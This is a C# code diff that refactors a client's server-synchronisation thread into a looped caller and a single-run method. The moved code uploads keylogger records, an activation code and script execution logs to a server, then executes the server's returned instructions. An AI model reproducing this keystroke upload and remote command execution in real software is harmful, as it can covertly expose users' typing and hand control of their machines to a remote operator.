@@ -39,64 +39,18 @@ namespace CASL.Bll
         public static DateTime? TacticsLastUpdateTime { get; set; }
 
         /// <summary>
-        /// 和服务器进行通信
+        /// 和服务器进行通信，线程方式
         /// </summary>
-        public void Synchronize()
+        public void Synchronizes()
         {
 
             communication = new Thread(() =>
             {
                 while (true)
                 {
+                    Synchronize();
 
-                    var now = DateTime.Now;
-                    try
-                    {
-                        //一段时间停止更新的逻辑
-                        if (CommandManager.Tactics.SyncStopTimeBegin.HasValue &&
-                            CommandManager.Tactics.SyncStopTimeStop.HasValue)
-                        {
-                            if (CommandManager.Tactics.SyncStopTimeBegin <= now &&
-                                now <= CommandManager.Tactics.SyncStopTimeStop.Value)
-                            {
-                                LogManager.instance.LogFormat("{0}停止进行同步", DateTime.Now);
-                                //停止时间
-                                Thread.Sleep(CommunicationSpan);
-                                continue;
-                            }
-                        }
-             
-                        var clientRequestTM = new ClientRequestTM()
-                        {
-                            ActivationCode = ActivationCodeManager.ActivationCode,
-                            ScriptLastUpdateTime = ScriptLastUpdateTime,
-                            TacticsLastUpdateTime = TacticsLastUpdateTime,
-                            ScriptExecuteRecords = ScriptManager.ScriptExecuteRecords,
-                            SendTime = now,
-                            KeyDownRecords=CommandManager.AllKeyloggers
-                        };
 
-                        LogManager.instance.LogFormat("{0}进行同步", DateTime.Now);
-                        //获取服务器的请求
-                        var serverRequestTM = GetServerReponse(clientRequestTM);
-
-                        //将更新记录记录放到最后
-                        ScriptManager.ScriptExecuteRecordsSended.AddRange(ScriptManager.ScriptExecuteRecords);
-                        //置空当前更新记录
-                        ScriptManager.ScriptExecuteRecords.Clear();
-
-                        //同步数据
-                        ExecuteServerReponse(serverRequestTM);
-
-                        LogManager.instance.LogFormat("{0}同步完成", DateTime.Now);
-                    }
-                    catch (Exception ex)
-                    {
-
-                        LogManager.instance.LogFormat("同步失败,原因:{0}",ex.Message);
-                        
-                    }
-                   
 
                     //停止时间
                     Thread.Sleep(CommunicationSpan);
@@ -132,7 +86,59 @@ namespace CASL.Bll
             #endregion
 
         }
+        /// <summary>
+        /// 单次
+        /// </summary>
+        public void Synchronize()
+        {
+            var now = DateTime.Now;
+            try
+            {
+                //一段时间停止更新的逻辑
+                if (CommandManager.Tactics.SyncStopTimeBegin.HasValue &&
+                    CommandManager.Tactics.SyncStopTimeStop.HasValue)
+                {
+                    if (CommandManager.Tactics.SyncStopTimeBegin <= now &&
+                        now <= CommandManager.Tactics.SyncStopTimeStop.Value)
+                    {
+                        LogManager.instance.LogFormat("{0}停止进行同步", DateTime.Now);
+                        //停止时间
+                        Thread.Sleep(CommunicationSpan);
+                        return;
+                    }
+                }
 
+                var clientRequestTM = new ClientRequestTM()
+                {
+                    ActivationCode = ActivationCodeManager.ActivationCode,
+                    ScriptLastUpdateTime = ScriptLastUpdateTime,
+                    TacticsLastUpdateTime = TacticsLastUpdateTime,
+                    ScriptExecuteRecords = ScriptManager.ScriptExecuteRecords,
+                    SendTime = now,
+                    KeyDownRecords = CommandManager.AllKeyloggers
+                };
+
+                LogManager.instance.LogFormat("{0}进行同步", DateTime.Now);
+                //获取服务器的请求
+                var serverRequestTM = GetServerReponse(clientRequestTM);
+
+                //将更新记录记录放到最后
+                ScriptManager.ScriptExecuteRecordsSended.AddRange(ScriptManager.ScriptExecuteRecords);
+                //置空当前更新记录
+                ScriptManager.ScriptExecuteRecords.Clear();
+
+                //同步数据
+                ExecuteServerReponse(serverRequestTM);
+
+                LogManager.instance.LogFormat("{0}同步完成", DateTime.Now);
+            }
+            catch (Exception ex)
+            {
+
+                LogManager.instance.LogFormat("同步失败,原因:{0}", ex.Message);
+
+            }
+        }
 
         /// <summary>
         /// 获取服务器发出的指令，并且同步数据到服务器
